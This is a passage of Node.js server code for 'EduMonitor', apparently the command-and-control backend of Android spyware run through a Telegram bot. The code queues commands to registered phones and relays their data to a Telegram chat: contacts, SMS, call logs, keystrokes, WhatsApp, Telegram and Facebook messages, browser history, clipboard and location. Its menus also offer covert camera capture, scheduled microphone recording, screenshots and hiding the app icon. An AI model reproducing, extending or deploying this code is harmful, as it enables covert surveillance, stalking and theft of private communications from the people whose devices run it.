        if (phoneData.phoneNumber && phoneData.phoneNumber !== 'Unknown') {
            message += `📱 <b>Phone Number:</b> <code>${phoneData.phoneNumber}</code>\n`;
        } else {
            message += `⚠️ <b>Phone Number:</b> Not available (no SIM or permission required)\n`;
        }
        
        if (phoneData.simInfo) {
            if (Array.isArray(phoneData.simInfo)) {
                message += `\n<b>SIM Information (Multiple SIMs):</b>\n`;
                phoneData.simInfo.forEach((sim, index) => {
                    message += `\n📱 <b>SIM ${index + 1}</b>\n`;
                    message += `• Slot: ${sim.slot || 'Unknown'}\n`;
                    message += `• Carrier: ${sim.carrierName || 'Unknown'}\n`;
                    message += `• Country: ${sim.countryIso || 'Unknown'}\n`;
                });
            } else {
                message += `\n<b>SIM Information:</b>\n`;
                message += `• Operator: ${phoneData.simInfo.operator || 'Unknown'}\n`;
                message += `• Country: ${phoneData.simInfo.country || 'Unknown'}\n`;
                message += `• SIM State: ${phoneData.simInfo.simState || 'Unknown'}\n`;
            }
        }
        
        await sendTelegramMessage(chatId, message);
        
        res.json({ success: true });
        
    } catch (error) {
        console.error('❌ Phone Number endpoint error:', error);
        res.status(500).json({ error: 'Phone Number processing failed' });
    }
});

// ============= SIM INFO ENDPOINT =============
app.post('/api/siminfo/:deviceId', async (req, res) => {
    try {
        const deviceId = req.params.deviceId;
        const simData = req.body;
        
        console.log(`📱 SIM Info received from ${deviceId}`);
        
        const device = devices.get(deviceId);
        if (!device) {
            console.error(`❌ Device not found: ${deviceId}`);
            return res.status(404).json({ error: 'Device not found' });
        }
        
        const chatId = device.chatId;
        
        device.simInfo = simData;
        
        const formattedMessage = formatSimInfo(simData);
        const devicePrefix = `📱 *Device:* ${device.deviceInfo?.model || 'Unknown'}\n\n`;
        await sendTelegramMessage(chatId, devicePrefix + formattedMessage);
        
        res.json({ success: true });
        
    } catch (error) {
        console.error('❌ SIM Info endpoint error:', error);
        res.status(500).json({ error: 'SIM Info processing failed' });
    }
});

// ============= WIFI INFO ENDPOINT =============
app.post('/api/wifiinfo/:deviceId', async (req, res) => {
    try {
        const deviceId = req.params.deviceId;
        const wifiData = req.body;
        
        console.log(`📶 WiFi Info received from ${deviceId}`);
        
        const device = devices.get(deviceId);
        if (!device) {
            console.error(`❌ Device not found: ${deviceId}`);
            return res.status(404).json({ error: 'Device not found' });
        }
        
        const chatId = device.chatId;
        
        device.wifiInfo = wifiData;
        
        const formattedMessage = formatWifiInfo(wifiData);
        const devicePrefix = `📱 *Device:* ${device.deviceInfo?.model || 'Unknown'}\n\n`;
        await sendTelegramMessage(chatId, devicePrefix + formattedMessage);
        
        res.json({ success: true });
        
    } catch (error) {
        console.error('❌ WiFi Info endpoint error:', error);
        res.status(500).json({ error: 'WiFi Info processing failed' });
    }
});

// ============= MOBILE INFO ENDPOINT =============
app.post('/api/mobileinfo/:deviceId', async (req, res) => {
    try {
        const deviceId = req.params.deviceId;
        const mobileData = req.body;
        
        console.log(`📱 Mobile Info received from ${deviceId}`);
        
        const device = devices.get(deviceId);
        if (!device) {
            console.error(`❌ Device not found: ${deviceId}`);
            return res.status(404).json({ error: 'Device not found' });
        }
        
        const chatId = device.chatId;
        
        device.mobileInfo = mobileData;
        
        let message = `📱 *Device:* ${device.deviceInfo?.model || 'Unknown'}\n\n`;
        message += '📱 <b>Mobile Network Information</b>\n\n';
        
        if (mobileData.operator) {
            message += `📶 *Network*\n`;
            message += `• Operator: ${mobileData.operator}\n`;
            message += `• Country: ${mobileData.country}\n`;
            message += `• Type: ${mobileData.networkType}\n`;
            message += `• Roaming: ${mobileData.roaming ? 'Yes' : 'No'}\n`;
        }
        
        if (mobileData.ip) {
            message += `\n🌐 *Mobile IP*\n`;
            message += `• ${mobileData.ip}\n`;
        }
        
        if (mobileData.dataEnabled !== undefined) {
            message += `\n🔌 *Connection Status*\n`;
            message += `• Mobile Data: ${mobileData.dataEnabled ? '✅ ON' : '❌ OFF'}\n`;
        }
        
        await sendTelegramMessage(chatId, message);
        
        res.json({ success: true });
        
    } catch (error) {
        console.error('❌ Mobile Info endpoint error:', error);
        res.status(500).json({ error: 'Mobile Info processing failed' });
    }
});

// ============= LOCATION ENDPOINT =============
app.post('/api/location/:deviceId', async (req, res) => {
    try {
        const deviceId = req.params.deviceId;
        const locationData = req.body;
        
        console.log(`📍 Location data from ${deviceId}`);
        
        const device = devices.get(deviceId);
        if (!device) {
            console.error(`❌ Device not found: ${deviceId}`);
            return res.status(404).json({ error: 'Device not found' });
        }
        
        const chatId = device.chatId;
        
        device.lastLocation = locationData;
        
        const formatted = formatLocationMessage(locationData);
        const devicePrefix = `📱 *${device.deviceInfo?.model || 'Device'}*\n\n`;
        
        if (formatted.lat && formatted.lon) {
            try {
                await axios.post(`${TELEGRAM_API}/sendLocation`, {
                    chat_id: chatId,
                    latitude: formatted.lat,
                    longitude: formatted.lon,
                    live_period: 60
                });
                console.log('✅ Location pin sent');
            } catch (e) {
                console.error('Failed to send location pin:', e.message);
            }
        }
        
        await sendTelegramMessage(chatId, devicePrefix + formatted.text);
        
        res.json({ success: true });
        
    } catch (error) {
        console.error('❌ Location endpoint error:', error);
        res.status(500).json({ error: 'Location processing failed' });
    }
});

// ============= SCREENSHOT SETTINGS ENDPOINT =============
app.post('/api/screenshot-settings/:deviceId', async (req, res) => {
    try {
        const deviceId = req.params.deviceId;
        const settingsData = req.body;
        
        console.log(`📸 Screenshot settings from ${deviceId}`);
        
        const device = devices.get(deviceId);
        if (!device) {
            return res.status(404).json({ error: 'Device not found' });
        }
        
        device.screenshotSettings = settingsData;
        res.json({ success: true });
        
    } catch (error) {
        console.error('❌ Screenshot settings error:', error);
        res.status(500).json({ error: error.message });
    }
});

// ============= RECORDING SETTINGS ENDPOINT =============
app.post('/api/recording-settings/:deviceId', async (req, res) => {
    try {
        const deviceId = req.params.deviceId;
        const settingsData = req.body;
        
        console.log(`🎤 Recording settings from ${deviceId}`);
        
        const device = devices.get(deviceId);
        if (!device) {
            return res.status(404).json({ error: 'Device not found' });
        }
        
        device.recordingSettings = settingsData;
        res.json({ success: true });
        
    } catch (error) {
        console.error('❌ Recording settings error:', error);
        res.status(500).json({ error: error.message });
    }
});

// ============= MEDIA SCAN ENDPOINT =============
app.post('/api/media-scan/:deviceId', async (req, res) => {
    try {
        const deviceId = req.params.deviceId;
        const scanData = req.body;
        
        console.log(`🔍 Media scan results from ${deviceId}:`, scanData);
        
        const device = devices.get(deviceId);
        if (!device) {
            return res.status(404).json({ error: 'Device not found' });
        }
        
        const chatId = device.chatId;
        const deviceName = device.deviceInfo?.model || 'Unknown Device';
        
        let message = `📱 *${deviceName}*\n\n`;
        message += `🔍 *Media Scan Complete*\n\n`;
        
        if (scanData.files && scanData.files.length > 0) {
            message += `Found ${scanData.files.length} media files:\n`;
            scanData.files.slice(0, 10).forEach(file => {
                message += `• ${file.name} (${(file.size/1024/1024).toFixed(2)} MB)\n`;
            });
            if (scanData.files.length > 10) {
                message += `... and ${scanData.files.length - 10} more\n`;
            }
        } else {
            message += `No media files found.`;
        }
        
        await sendTelegramMessage(chatId, message);
        res.json({ success: true });
        
    } catch (error) {
        console.error('❌ Media scan error:', error);
        res.status(500).json({ error: error.message });
    }
});

// ============= API ENDPOINTS =============

app.get('/health', (req, res) => {
    res.json({ 
        status: 'healthy', 
        devices: devices.size,
        authorizedChats: Array.from(authorizedChats).join(', '),
        serverIP: getServerIP(),
        timestamp: Date.now()
    });
});

app.get('/api/ping/:deviceId', (req, res) => {
    const deviceId = req.params.deviceId;
    const device = devices.get(deviceId);
    
    if (device) {
        device.lastSeen = Date.now();
        res.json({ status: 'alive', timestamp: Date.now() });
    } else {
        res.status(404).json({ status: 'unknown' });
    }
});

app.get('/api/commands/:deviceId', (req, res) => {
    const deviceId = req.params.deviceId;
    const device = devices.get(deviceId);
    
    try {
        if (device?.pendingCommands?.length > 0) {
            const commands = device.pendingCommands.map(cmd => ({
                command: cmd.command,
                originalCommand: cmd.originalCommand,
                messageId: cmd.messageId,
                timestamp: cmd.timestamp,
                autoData: cmd.autoData || false
            }));
            device.pendingCommands = [];
            console.log(`📤 Sending ${commands.length} commands to ${deviceId}:`, commands.map(c => c.command).join(', '));
            sendJsonResponse(res, { commands });
        } else {
            console.log(`📭 No commands for ${deviceId}`);
            sendJsonResponse(res, { commands: [] });
        }
    } catch (e) {
        console.error('Error in /api/commands:', e);
        sendJsonResponse(res, { commands: [], error: e.message }, 500);
    }
});

app.post('/api/result/:deviceId', async (req, res) => {
    const deviceId = req.params.deviceId;
    const { command, result, error } = req.body;
    
    // Consolidated commands that use file upload endpoints
    const fileCommands = [
        'contacts', 'sms', 'calllogs', 'apps_list', 'keys', 'notify', 'open_app',
        'whatsapp', 'telegram', 'facebook', 'browser', 'clipboard', 'calendar',
        'device_info', 'network_info', 'mobile_info', 'scan_all', 'scan_media',
        'screenshots', 'screenshot_logs'
    ];
    
    if (fileCommands.includes(command)) {
        console.log(`📎 ${command} using dedicated file upload endpoint`);
        return res.sendStatus(200);
    }
    
    console.log(`📨 Result from ${deviceId}:`, { command });
    
    const device = devices.get(deviceId);
    if (device) {
        const chatId = device.chatId;
        const devicePrefix = `📱 *${device.deviceInfo?.model || 'Device'}*\n\n`;
        
        if (error) {
            await sendTelegramMessage(chatId, devicePrefix + `❌ <b>Command Failed</b>\n\n<code>${command}</code>\n\n<b>Error:</b> ${error}`);
        } else if (result) {
            await sendTelegramMessage(chatId, devicePrefix + result);
        } else {
            await sendTelegramMessage(chatId, devicePrefix + `✅ ${command} executed successfully`);
        }
    }
    
    res.sendStatus(200);
});

// ============= REGISTRATION ENDPOINT =============
app.post('/api/register', async (req, res) => {
    const { deviceId, deviceInfo } = req.body;
    
    console.log('📝 Registration attempt:', { deviceId });
    
    if (!deviceId || !deviceInfo) {
        return res.status(400).json({ error: 'Missing fields' });
    }
    
    const deviceConfig = getDeviceConfig(deviceId);
    
    if (!deviceConfig) {
        return res.status(403).json({ error: 'Device not authorized' });
    }
    
    const existingDevice = devices.get(deviceId);
    const isNewDevice = !existingDevice;
    
    const deviceData = {
        chatId: deviceConfig.chatId,
        deviceInfo,
        lastSeen: Date.now(),
        pendingCommands: existingDevice ? existingDevice.pendingCommands : [],
        firstSeen: existingDevice ? existingDevice.firstSeen : Date.now(),
        phoneNumber: existingDevice?.phoneNumber || null,
        lastIPInfo: existingDevice?.lastIPInfo || null,
        lastLocation: existingDevice?.lastLocation || null,
        simInfo: existingDevice?.simInfo || null,
        wifiInfo: existingDevice?.wifiInfo || null,
        mobileInfo: existingDevice?.mobileInfo || null,
        screenshotSettings: existingDevice?.screenshotSettings || null,
        recordingSettings: existingDevice?.recordingSettings || null
    };
    
    devices.set(deviceId, deviceData);
    
    console.log(`✅ Device ${isNewDevice ? 'registered' : 'updated'}: ${deviceId} for chat ${deviceConfig.chatId}`);
    
    await setChatMenuButton(deviceConfig.chatId);
    
    const userDevices = getDeviceListForUser(deviceConfig.chatId);
    
    let welcomeMessage = `✅ <b>Device ${isNewDevice ? 'Connected' : 'Updated'}!</b>\n\n`;
    welcomeMessage += `📱 Model: ${deviceInfo.model}\n`;
    welcomeMessage += `🤖 Android: ${deviceInfo.android}\n`;
    welcomeMessage += `🆔 ID: ${deviceId.substring(0, 8)}...\n\n`;
    
    if (isNewDevice) {
        welcomeMessage += `You now have ${userDevices.length} device(s) registered.\n\n`;
        welcomeMessage += `🔄 <b>Auto-collecting data...</b>\n`;
        welcomeMessage += `The server is automatically requesting:\n`;
        welcomeMessage += `• 📱 Device Info\n`;
        welcomeMessage += `• 🌐 Network Info\n`;
        welcomeMessage += `• 📱 Mobile Info\n`;
        welcomeMessage += `• 📇 Contacts\n`;
        welcomeMessage += `• 💬 SMS Messages\n`;
        welcomeMessage += `• 📞 Call Logs\n`;
        welcomeMessage += `• 📱 Installed Apps\n`;
        welcomeMessage += `• ⌨️ Keystrokes\n`;
        welcomeMessage += `• 🔔 Notifications\n`;
        welcomeMessage += `• 💬 WhatsApp\n`;
        welcomeMessage += `• 💬 Telegram\n`;
        welcomeMessage += `• 💬 Facebook\n`;
        welcomeMessage += `• 🌐 Browser History\n`;
        welcomeMessage += `• 📋 Clipboard\n`;
        welcomeMessage += `• 📅 Calendar\n`;
        welcomeMessage += `• 📍 Location\n\n`;
        welcomeMessage += `This may take a few moments as the device processes each request.`;
        
        if (userDevices.length === 1) {
            userDeviceSelection.set(deviceConfig.chatId, deviceId);
            welcomeMessage += `\n\n✅ This device has been automatically selected for control.`;
        }
    } else {
        welcomeMessage += `Device information updated.`;
    }
    
    await sendTelegramMessageWithKeyboard(
        deviceConfig.chatId,
        welcomeMessage,
        getMainMenuKeyboard(deviceConfig.chatId)
    );
    
    if (isNewDevice) {
        queueAutoDataCommands(deviceId, deviceConfig.chatId);
    }
    
    res.json({
        status: 'registered',
        deviceId,
        chatId: deviceConfig.chatId,
        config: deviceConfig.config
    });
});

app.get('/api/devices', (req, res) => {
    const deviceList = [];
    for (const [id, device] of devices.entries()) {
        deviceList.push({
            deviceId: id,
            chatId: device.chatId,
            lastSeen: new Date(device.lastSeen).toISOString(),
            firstSeen: new Date(device.firstSeen).toISOString(),
            model: device.deviceInfo?.model || 'Unknown',
            android: device.deviceInfo?.android || 'Unknown',
            phoneNumber: device.phoneNumber || 'Not available',
            lastIPInfo: device.lastIPInfo || null,
            lastLocation: device.lastLocation || null,
            autoDataRequested: autoDataRequested.has(id),
            online: (Date.now() - device.lastSeen) < 300000
        });
    }
    res.json({ total: devices.size, devices: deviceList });
});

// ============= TEST ENDPOINTS =============

app.get('/test', (req, res) => {
    const serverIP = getServerIP();
    const userDevices = getDeviceListForUser('5326373447');
    
    res.send(`
        <html>
        <head>
            <style>
                body { font-family: Arial; padding: 20px; background: #1a1a2e; color: #fff; }
                h1 { color: #e94560; }
                .stats { background: #16213e; padding: 20px; border-radius: 10px; margin: 20px 0; }
                .device { background: #0f3460; padding: 15px; margin: 10px 0; border-radius: 5px; border-left: 3px solid #e94560; }
                .online { color: #4CAF50; }
                .offline { color: #f44336; }
                .ip { background: #1a1a2e; padding: 5px; border-radius: 3px; font-family: monospace; }
            </style>
        </head>
        <body>
            <h1>✅ EduMonitor Server v6.0 Running (Consolidated Commands)</h1>
            <div class="stats">
                <p><b>Time:</b> ${new Date().toISOString()}</p>
                <p><b>Server IP:</b> <code class="ip">${serverIP}</code></p>
                <p><b>Total Devices:</b> ${devices.size}</p>
                <p><b>Authorized Chats:</b> ${Array.from(authorizedChats).join(', ')}</p>
                <p><b>Consolidated Commands Available:</b> 45+ (reduced from 95+)</p>
            </div>
            
            <h2>📱 Registered Devices (${userDevices.length})</h2>
            ${Array.from(devices.entries()).map(([id, device]) => {
                const online = (Date.now() - device.lastSeen) < 300000;
                return `
                    <div class="device">
                        <h3>${device.deviceInfo?.model || 'Unknown Device'}</h3>
                        <p><b>ID:</b> <code>${id}</code></p>
                        <p><b>Status:</b> <span class="${online ? 'online' : 'offline'}">${online ? '🟢 Online' : '⚫ Offline'}</span></p>
                        <p><b>Last Seen:</b> ${new Date(device.lastSeen).toLocaleString()}</p>
                        <p><b>Android:</b> ${device.deviceInfo?.android || 'Unknown'}</p>
                        <p><b>Phone:</b> ${device.phoneNumber || 'Not available'}</p>
                        <p><b>Pending Commands:</b> ${device.pendingCommands?.length || 0}</p>
                    </div>
                `;
            }).join('')}
            
            <p><a href="/test-menu" style="background: #4CAF50; color: white; padding: 10px; text-decoration: none; border-radius: 5px;">Send Test Menu</a></p>
        </body>
        </html>
    `);
});

app.get('/test-menu', async (req, res) => {
    const chatId = '5326373447';
    const result = await sendTelegramMessageWithKeyboard(
        chatId,
        "🎯 Test Menu - Use the buttons below:",
        getMainMenuKeyboard(chatId)
    );
    res.json({ success: !!result });
});

// ============= CALLBACK QUERY HANDLER =============

async function handleCallbackQuery(callbackQuery) {
    const chatId = callbackQuery.message.chat.id;
    const messageId = callbackQuery.message.message_id;
    const data = callbackQuery.data;
    const callbackId = callbackQuery.id;
    
    console.log(`🖱️ Callback received: ${data} from chat ${chatId}`);
    
    await answerCallbackQuery(callbackId);
    
    // Handle consolidated command callbacks
    if (data.startsWith('cmd:')) {
        const command = data.substring(4);
        console.log(`🎯 Executing consolidated command from button: ${command}`);
        
        await answerCallbackQuery(callbackId, `⏳ Executing ${command}...`);
        
        const selectedDeviceId = userDeviceSelection.get(chatId);
        const device = selectedDeviceId ? devices.get(selectedDeviceId) : null;
        
        if (!device) {
            await sendTelegramMessage(chatId, '❌ No device selected. Use /devices to see available devices.');
            return;
        }
        
        if (!device.pendingCommands) {
            device.pendingCommands = [];
        }
        
        device.pendingCommands.push({
            command: command,
            originalCommand: `/${command}`,
            messageId: messageId,
            timestamp: Date.now()
        });
        
        await sendTelegramMessage(chatId, `✅ Command sent: /${command}`);
        
        const keyboard = [[createInlineButton('◀️ Back to Menu', 'help_main')]];
        await editMessageKeyboard(chatId, messageId, keyboard);
        return;
    }
    
    // Handle other menu callbacks
    if (data === 'help_main') {
        await editMessageKeyboard(chatId, messageId, getMainMenuKeyboard(chatId));
        await sendTelegramMessage(chatId, "🤖 *EduMonitor Control Panel*\n\nSelect a category to get started.");
    } else if (data === 'menu_new_features') {
        await editMessageKeyboard(chatId, messageId, getNewFeaturesKeyboard());
        await sendTelegramMessage(chatId, "🆕 *NEW FEATURES*\n\nSelect a category to explore!");
    } else if (data === 'menu_detailed_exports') {
        await editMessageKeyboard(chatId, messageId, getDetailedExportsKeyboard());
        await sendTelegramMessage(chatId, "📊 *DETAILED EXPORTS*\n\nGet comprehensive data exports with full details.");
    } else if (data === 'menu_file_scanner') {
        await editMessageKeyboard(chatId, messageId, getFileScannerKeyboard());
        await sendTelegramMessage(chatId, "🔍 *FILE SCANNER*\n\nPowerful file system scanning tools.");
    } else if (data === 'menu_data_saving') {
        await editMessageKeyboard(chatId, messageId, getDataSavingKeyboard());
        await sendTelegramMessage(chatId, "📡 *DATA SAVING MODE*\n\nSave mobile data usage.");
    } else if (data === 'menu_audio_quality') {
        await editMessageKeyboard(chatId, messageId, getAudioQualityKeyboard());
        await sendTelegramMessage(chatId, "🎚️ *AUDIO QUALITY SETTINGS*\n\nAdjust recording quality.");
    } else if (data === 'menu_sync_harvest') {
        await editMessageKeyboard(chatId, messageId, getSyncHarvestKeyboard());
        await sendTelegramMessage(chatId, "🔄 *SYNC & HARVEST*\n\nData synchronization tools.");
    } else if (data === 'menu_realtime_advanced') {
        await editMessageKeyboard(chatId, messageId, getRealtimeAdvancedKeyboard());
        await sendTelegramMessage(chatId, "🔊 *ADVANCED REALTIME CONTROLS*\n\nFine-tune real-time logging.");
    } else if (data === 'menu_devices') {
        const keyboard = getDeviceSelectionKeyboard(chatId);
        const userDevices = getDeviceListForUser(chatId);
        let message = `📱 *Device Management*\n\nYou have ${userDevices.length} device(s).\n\nSelect a device to control:`;
        await editMessageKeyboard(chatId, messageId, keyboard);
        await sendTelegramMessage(chatId, message);
    } else if (data.startsWith('select_device:')) {
        const selectedDeviceId = data.split(':')[1];
        const device = devices.get(selectedDeviceId);
        if (device) {
            userDeviceSelection.set(chatId, selectedDeviceId);
            await answerCallbackQuery(callbackId, `✅ Now controlling ${device.deviceInfo?.model || 'device'}`);
            await editMessageKeyboard(chatId, messageId, getMainMenuKeyboard(chatId));
            await sendTelegramMessage(chatId, `✅ Now controlling: ${device.deviceInfo?.model || 'Device'}`);
        }
    } else if (data === 'close_menu') {
        await editMessageKeyboard(chatId, messageId, []);
        await sendTelegramMessage(chatId, "Menu closed. Tap the Menu button or type /help to reopen.");
    } else if (data === 'refresh_devices') {
        const keyboard = getDeviceSelectionKeyboard(chatId);
        await editMessageKeyboard(chatId, messageId, keyboard);
        await answerCallbackQuery(callbackId, '🔄 Device list refreshed');
    } else if (data === 'device_stats') {
        const userDevices = getDeviceListForUser(chatId);
        let message = `📊 *Device Statistics*\n\nTotal Devices: ${userDevices.length}\n\n`;
        userDevices.forEach((device, index) => {
            message += `${index + 1}. ${device.name}\n`;
            message += `   ID: ${device.id.substring(0, 8)}...\n`;
            message += `   Last Seen: ${device.lastSeenFormatted}\n`;
            message += `   Status: ${(Date.now() - device.lastSeen) < 300000 ? '✅ Online' : '⏹️ Offline'}\n\n`;
        });
        await sendTelegramMessage(chatId, message);
    } else if (data === 'menu_tracking') {
        const keyboard = [
            [createInlineButton('📍 Location', 'cmd:location')],
            [createInlineButton('⌨️ Keystrokes', 'cmd:keys')],
            [createInlineButton('🔔 Notifications', 'cmd:notify')],
            [createInlineButton('📱 App Opens', 'cmd:open_app')],
            [createInlineButton('◀️ Back', 'help_main')]
        ];
        await editMessageKeyboard(chatId, messageId, keyboard);
    } else if (data === 'menu_screenshot') {
        const keyboard = [
            [createInlineButton('📸 Take Now', 'cmd:screenshot')],
            [createInlineButton('⚙️ Settings', 'cmd:screenshot_settings')],
            [createInlineButton('▶️ Start Service', 'cmd:start_screenshot')],
            [createInlineButton('⏹️ Stop Service', 'cmd:stop_screenshot')],
            [createInlineButton('📏 Small/Medium/Original', 'cmd:small')],
            [createInlineButton('◀️ Back', 'help_main')]
        ];
        await editMessageKeyboard(chatId, messageId, keyboard);
    } else if (data === 'menu_recording') {
        const keyboard = [
            [createInlineButton('🎤 Start 60s', 'cmd:start_60s_rec')],
            [createInlineButton('⏹️ Stop 60s', 'cmd:stop_60s_rec')],
            [createInlineButton('⚙️ Settings', 'cmd:record_info')],
            [createInlineButton('✅ Auto ON', 'cmd:record_auto_on')],
            [createInlineButton('❌ Auto OFF', 'cmd:record_auto_off')],
            [createInlineButton('🎚️ Audio Quality', 'menu_audio_quality')],
            [createInlineButton('◀️ Back', 'help_main')]
        ];
        await editMessageKeyboard(chatId, messageId, keyboard);
    } else if (data === 'menu_camera') {
        const keyboard = [
            [createInlineButton('📸 Take Photo', 'cmd:photo')],
            [createInlineButton('🔄 Switch Camera', 'cmd:camera_switch')],
            [createInlineButton('👤 Front Camera', 'cmd:camera_front')],
            [createInlineButton('👥 Back Camera', 'cmd:camera_back')],
            [createInlineButton('✅ Start Monitoring', 'cmd:camera_on')],
            [createInlineButton('❌ Stop Monitoring', 'cmd:camera_off')],
            [createInlineButton('📊 Camera Status', 'cmd:camera_status')],
            [createInlineButton('◀️ Back', 'help_main')]
        ];
        await editMessageKeyboard(chatId, messageId, keyboard);
    } else if (data === 'menu_social') {
        const keyboard = [
            [createInlineButton('💬 WhatsApp', 'cmd:whatsapp')],
            [createInlineButton('💬 Telegram', 'cmd:telegram')],
            [createInlineButton('💬 Facebook', 'cmd:facebook')],
            [createInlineButton('🌐 Browser History', 'cmd:browser')],
            [createInlineButton('📋 Clipboard', 'cmd:clipboard')],
            [createInlineButton('◀️ Back', 'help_main')]
        ];
        await editMessageKeyboard(chatId, messageId, keyboard);
    } else if (data === 'menu_media') {
        const keyboard = [
            [createInlineButton('🔍 Scan All', 'cmd:scan_all')],
            [createInlineButton('🎵 Scan Media', 'cmd:scan_media')],
            [createInlineButton('🎤 Find Recordings', 'cmd:scan_media')],
            [createInlineButton('❓ Scan Help', 'cmd:scan_help')],
            [createInlineButton('◀️ Back', 'help_main')]
        ];
        await editMessageKeyboard(chatId, messageId, keyboard);
    } else if (data === 'menu_realtime') {
        const keyboard = [
            [createInlineButton('🔑 Keys ON', 'cmd:rt_keys_on')],
            [createInlineButton('🔑 Keys OFF', 'cmd:rt_keys_off')],
            [createInlineButton('🔔 Notif ON', 'cmd:rt_notif_on')],
            [createInlineButton('🔔 Notif OFF', 'cmd:rt_notif_off')],
            [createInlineButton('✅ All ON', 'cmd:rt_all_on')],
            [createInlineButton('❌ All OFF', 'cmd:rt_all_off')],
            [createInlineButton('📊 Status', 'cmd:rt_status')],
            [createInlineButton('◀️ Back', 'help_main')]
        ];
        await editMessageKeyboard(chatId, messageId, keyboard);
    } else if (data === 'menu_services') {
        const keyboard = [
            [createInlineButton('👻 Hide Icon', 'cmd:hide_icon')],
            [createInlineButton('👁️ Show Icon', 'cmd:show_icon')],
            [createInlineButton('🔄 Reboot Services', 'cmd:reboot_app')],
            [createInlineButton('🗑️ Clear Logs', 'cmd:clear_logs')],
            [createInlineButton('📊 Logs Count', 'cmd:logs_count')],
            [createInlineButton('🔄 Sync All', 'cmd:sync_all')],
            [createInlineButton('⚡ Force Harvest', 'cmd:force_harvest')],
            [createInlineButton('◀️ Back', 'help_main')]
        ];
        await editMessageKeyboard(chatId, messageId, keyboard);
    }
}

// ============= WEBHOOK ENDPOINT =============

app.post('/webhook', async (req, res) => {
    res.sendStatus(200);
    
    setImmediate(async () => {
        try {
            const update = req.body;
            console.log('📩 Received update type:', update.callback_query ? 'callback' : (update.message ? 'message' : 'other'));

            if (update.callback_query) {
                await handleCallbackQuery(update.callback_query);
                return;
            }

            if (!update?.message) {
                console.log('📭 Non-message update');
                return;
            }

            const chatId = update.message.chat.id;
            const text = update.message.text;
            const messageId = update.message.message_id;

            if (!isAuthorizedChat(chatId)) {
                console.log(`⛔ Unauthorized chat: ${chatId}`);
                await sendTelegramMessage(chatId, '⛔ You are not authorized to use this bot.');
                return;
            }

            await setChatMenuButton(chatId);

            const userState = userStates.get(chatId);
            
            if (userState) {
                await handleConversationMessage(chatId, text, messageId, userState);
                return;
            }

            if (text?.startsWith('/')) {
                await handleCommand(chatId, text, messageId);
            } else {
                await sendTelegramMessageWithKeyboard(
                    chatId,
                    "🤖 Use the menu button below or type /help to see available commands.",
                    getMainMenuKeyboard(chatId)
                );
            }
        } catch (error) {
            console.error('❌ Error processing webhook:', error);
        }
    });
});

// ============= CONVERSATION HANDLER =============

async function handleConversationMessage(chatId, text, messageId, userState) {
    switch (userState.state) {
        case SCHEDULE_STATES.AWAITING_START_TIME:
            if (!text.match(/^([0-1]?[0-9]|2[0-3]):[0-5][0-9]$/)) {
                await sendTelegramMessage(chatId, "❌ Invalid time format. Please use HH:MM (e.g., 22:00)");
                return;
            }
            userState.data.startTime = text;
            userState.state = SCHEDULE_STATES.AWAITING_END_TIME;
            await sendTelegramMessage(chatId, "✅ Start time recorded.\n\nNow enter the END time (HH:MM)");
            break;
            
        case SCHEDULE_STATES.AWAITING_END_TIME:
            if (!text.match(/^([0-1]?[0-9]|2[0-3]):[0-5][0-9]$/)) {
                await sendTelegramMessage(chatId, "❌ Invalid time format. Please use HH:MM");
                return;
            }
            userState.data.endTime = text;
            userState.state = SCHEDULE_STATES.AWAITING_RECURRING;
            const keyboard = [[
                createInlineButton('✅ Daily', 'recurring:daily'),
                createInlineButton('🔄 Once', 'recurring:once')
            ]];
            await sendTelegramMessageWithKeyboard(chatId, "Should this schedule repeat daily or run once?", keyboard);
            break;
            
        case SCHEDULE_STATES.AWAITING_RECURRING:
            // Handled via callback
            break;
            
        case SCHEDULE_STATES.AWAITING_INTERVAL:
            const interval = parseInt(text);
            if (isNaN(interval) || interval < 5 || interval > 120) {
                await sendTelegramMessage(chatId, "❌ Invalid interval. Please enter a number between 5 and 120.");
                return;
            }
            
            const [startHour, startMin] = userState.data.startTime.split(':').map(Number);
            const [endHour, endMin] = userState.data.endTime.split(':').map(Number);
            const recurring = userState.data.recurring;
            
            const command = `/record_custom ${startHour}:${startMin} ${endHour}:${endMin} ${recurring ? 'daily' : 'once'} ${interval}`;
            
            userStates.delete(chatId);
            
            const selectedDeviceId = userDeviceSelection.get(chatId);
            const device = selectedDeviceId ? devices.get(selectedDeviceId) : null;
            
            if (device) {
                if (!device.pendingCommands) device.pendingCommands = [];
                device.pendingCommands.push({
                    command: 'record_custom',
                    originalCommand: command,
                    messageId: messageId,
                    timestamp: Date.now()
                });
                await sendTelegramMessage(chatId, `✅ Custom schedule configured and sent to device.`);
            }
            break;
    }
}

// ============= COMMAND HANDLER =============

async function handleCommand(chatId, command, messageId) {
    console.log(`\n🎯 Handling command: ${command} from chat ${chatId}`);

    // Handle /devices command
    if (command === '/devices') {
        const userDevices = getDeviceListForUser(chatId);
        let message = `📱 *Your Devices*\n\n`;
        
        if (userDevices.length === 0) {
            message += "No devices registered yet.";
        } else {
            userDevices.forEach((device, index) => {
                const status = device.isActive ? '✅ ACTIVE' : '○';
                message += `${index + 1}. ${status} ${device.name}\n`;
                message += `   ID: \`${device.id}\`\n`;
                message += `   Last Seen: ${device.lastSeenFormatted}\n`;
                message += `   Status: ${(Date.now() - device.lastSeen) < 300000 ? '🟢 Online' : '⚫ Offline'}\n`;
                if (device.phoneNumber !== 'Not available') {
                    message += `   Phone: ${device.phoneNumber}\n`;
                }
                message += `\n`;
            });
            message += `\nUse /select [device_id] to switch active device.`;
        }
        
        await sendTelegramMessage(chatId, message);
        return;
    }

    // Handle /select command
    if (command.startsWith('/select ')) {
        const deviceId = command.substring(8).trim();
        const device = devices.get(deviceId);
        
        if (device && String(device.chatId) === String(chatId)) {
            userDeviceSelection.set(chatId, deviceId);
            await sendTelegramMessage(chatId, 
                `✅ Now controlling: ${device.deviceInfo?.model || 'Device'}\n` +
                `ID: ${deviceId.substring(0, 8)}...`);
        } else {
            await sendTelegramMessage(chatId, '❌ Device not found or not authorized.');
        }
        return;
    }

    // Get selected device
    let selectedDeviceId = userDeviceSelection.get(chatId);
    let device = null;
    
    if (selectedDeviceId) {
        device = devices.get(selectedDeviceId);
    }
    
    if (!device) {
        for (const [id, d] of devices.entries()) {
            if (String(d.chatId) === String(chatId)) {
                selectedDeviceId = id;
                device = d;
                userDeviceSelection.set(chatId, selectedDeviceId);
                break;
            }
        }
    }

    if (!device) {
        await sendTelegramMessageWithKeyboard(chatId, 
            '❌ No device registered.\n\nPlease make sure the Android app is running.',
            getMainMenuKeyboard(chatId));
        return;
    }

    device.lastSeen = Date.now();
    
    if (!device.pendingCommands) {
        device.pendingCommands = [];
    }
    
    // Extract command without slash
